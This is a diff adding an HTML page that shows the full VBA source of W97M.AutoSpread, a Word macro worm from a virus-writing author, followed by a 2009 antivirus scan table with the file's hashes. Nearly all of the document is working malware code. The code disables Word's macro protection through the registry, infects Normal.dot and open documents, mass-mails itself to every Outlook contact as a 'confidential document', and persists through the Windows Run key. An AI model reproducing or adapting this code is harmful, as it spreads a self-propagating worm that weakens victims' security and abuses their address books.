@@ -1,0 +1,161 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>20020509 - W97M.AutoSpread</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+}
+.sc7 {
+}
+.sc10 {
+}
+.sc11 {
+}
+.sc12 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' Name : W97M.AutoSpread
+' Author : PetiK
+' Language : VBA Word
+' Date : 09/05/2002
+</span><span class="sc0">
+</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"AutoSpread"</span><span class="sc0">
+
+</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Sleep&amp;</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwReserved</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AutoOpen</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">nam</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ActiveDocument.Name</span><span class="sc0">
+</span><span class="sc7">vnam</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">nam</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">nam</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">FuckProtection</span><span class="sc0">
+</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InfectWord</span><span class="sc0">
+</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Spread</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"This Document is infected by W97M."</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vnam</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbCritical</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W97M."</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vnam</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">".A"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InfectWord</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">nor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">NormalTemplate.VBProject.VBComponents</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">doc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ActiveDocument.VBProject.VBComponents</span><span class="sc0">
+</span><span class="sc7">srcmod</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\kitep.drv"</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">nor.Item</span><span class="sc6">(</span><span class="sc4">"AutoSpread"</span><span class="sc6">).</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"AutoSpread"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+    </span><span class="sc7">doc</span><span class="sc6">(</span><span class="sc4">"AutoSpread"</span><span class="sc6">).</span><span class="sc12">Export</span><span class="sc0"> </span><span class="sc7">srcmod</span><span class="sc0">
+    </span><span class="sc7">nor.Import</span><span class="sc0"> </span><span class="sc7">srcmod</span><span class="sc0">
+    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">doc.Item</span><span class="sc6">(</span><span class="sc4">"AutoSpread"</span><span class="sc6">).</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"AutoSpread"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+    </span><span class="sc7">nor</span><span class="sc6">(</span><span class="sc4">"AutoSpread"</span><span class="sc6">).</span><span class="sc12">Export</span><span class="sc0"> </span><span class="sc7">srcmod</span><span class="sc0">
+    </span><span class="sc7">doc.Import</span><span class="sc0"> </span><span class="sc7">srcmod</span><span class="sc0">
+    </span><span class="sc7">ActiveDocument.Save</span><span class="sc0">
+    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">srcmod</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">FuckProtection</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Options</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">ConfirmConversions</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">VirusProtection</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">SaveNormalPrompt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
+</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">Application.Version</span><span class="sc0">
+</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"10.0"</span><span class="sc0">
+    </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
+    </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AccessVBOM"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
+</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"9.0"</span><span class="sc0">
+    </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
+</span><span class="sc7">WordBasic.DisableAutoMacros</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Spread</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc7">subj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">ActiveDocument.Name</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">ActiveDocument.Name</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">att</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ActiveDocument.FullName</span><span class="sc0">
+</span><span class="sc7">win</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Environ</span><span class="sc6">(</span><span class="sc4">"windir"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">FileSystem.MkDir</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"\AutoSpread"</span><span class="sc0">
+</span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc7">nfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
+</span><span class="sc7">Randomize</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Timer</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">nfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">nfile</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">48</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc3">Loop</span><span class="sc0">
+</span><span class="sc7">reg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">nfile</span><span class="sc0">
+</span><span class="sc7">nfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">nfile</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+</span><span class="sc7">nfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"\AutoSpread\"</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">nfile</span><span class="sc0">
+</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">nfile</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"'From W97M.AutoSpread"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Set out=CreateObject(""Outlook.Application"")"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Set map=out.GetNameSpace(""MAPI"")"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"For Each C in map.AddressLists"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"If C.AddressEntries.Count &lt;&gt; 0 Then"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"For D=1 To C.AddressEntries.Count"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Set E=C.AddressEntries(D)"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Set env=out.CreateItem(0)"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"env.To=E.Address"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"env.Subject="""</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">subj</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"env.Body=""This confidential document is for you."""</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"env.Attachments.Add("""</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">att</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">""")"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"env.DeleteAfterSubmit=True"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"If env.To &lt;&gt; """" Then"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"env.Send"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Next"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Next"</span><span class="sc0">
+</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WScript.Quit"</span><span class="sc0">
+</span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">reg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">nfile</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">HelpAbout</span><span class="sc6">()</span><span class="sc0">
+
+</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Application.Assistant</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Visible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
+</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Assistant.NewBalloon</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Text</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"W97M.AutoSpread.A coded by PetiK (c)2002"</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Heading</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"W97M.AutoSpread"</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Animation</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">msoAnimationGetAttentionMajor</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Button</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">msoButtonSetOK</span><span class="sc0">
+    </span><span class="sc6">.</span><span class="sc7">Show</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
+
+</span><span class="sc7">slp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Sleep</span><span class="sc6">(</span><span class="sc2">5000</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">nb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc7">Selection.TypeText</span><span class="sc0"> </span><span class="sc4">"Hi guy, You're infected by my virus. It's not dangerous. "</span><span class="sc0">
+</span><span class="sc7">Selection.TypeText</span><span class="sc0"> </span><span class="sc4">"Refer to AntiVirus site to disinfect your computer. "</span><span class="sc0">
+</span><span class="sc7">Selection.TypeText</span><span class="sc0"> </span><span class="sc4">"No dangerous payload, large spread, it's coded by PetiK. "</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">nb</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc7">Sub</span>
+
+<span class="sc0"><table border="1"><tr><td colspan="4">File AutoSpread.doc received on 2009.06.10 04:49:34 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">Email-Worm.Win32.Petik!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.09</td><td style="color: red;">W97M/Apish.B</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">W2000M/Droopy.A</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td style="color: red;">Worm/Win32.Petik</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td style="color: red;">W97M/Beko.B@mm</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td style="color: red;">MW97:Beko family</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">W97M/Beko</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">W97M.Petik.A@mm</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td style="color: red;">W97M.ZMK.M</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td style="color: red;">WM.Pivis</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td style="color: red;">Worm.Win32.Email-Worm.Petik</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">W97M.Petik</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td style="color: red;">Win32.Petik</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td style="color: red;">W97M/Beko.B:mm</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td style="color: red;">W97M/Beko.B@mm</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">W97M/Petik.B</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">W97M.Petik.A@mm</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td style="color: red;">Macro.Beko</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">W97M/Generic@MM</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">W97M/Generic@MM</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Macro.Droopy.A</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td style="color: red;">Virus:W97M/Aspread.A@mm</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">W97M/Beko.B</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">W97M/Beko.B</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td style="color: red;">W97M.Petik.A@mm</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td style="color: red;">W97M/CokeBoy</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">WORD.97.Petaspr.A</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td style="color: red;">Worm.Mail.Agent.ac</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">WM97/Spread-A</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td>-</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">W97M.Beko@mm</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td style="color: red;">W2KM/Generico</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td style="color: red;">W97M_BEKO.B</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td style="color: red;">W97M.Beko.B</td</tr><tr><td>VirusBuster</td><td>4.6.5.0</td><td>2009.06.09</td><td style="color: red;">WORD.97.Petaspr.A</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 40960 bytes</td></tr><tr><td colspan="4">MD5...: b7f7ed86d457fec2493db21e8886b981</td></tr><tr><td colspan="4">SHA1..: 5f1c2e11b84ac3df1e06f9dc290c3706735b8065</td></tr><tr><td colspan="4">SHA256: 3ab8f56286e915dcf5656d8ecba063be06bc9dcbf23139f67a5bac0a413494fc</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: -</td></tr><tr><td colspan="4">TrID..: File type identification<br>Microsoft Word document (80.0%)<br>Generic OLE2 / Multistream Compound File (20.0%)</td></tr><tr><td colspan="4">PEInfo: -</td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr></table></span>
+</div></body>
+</html>
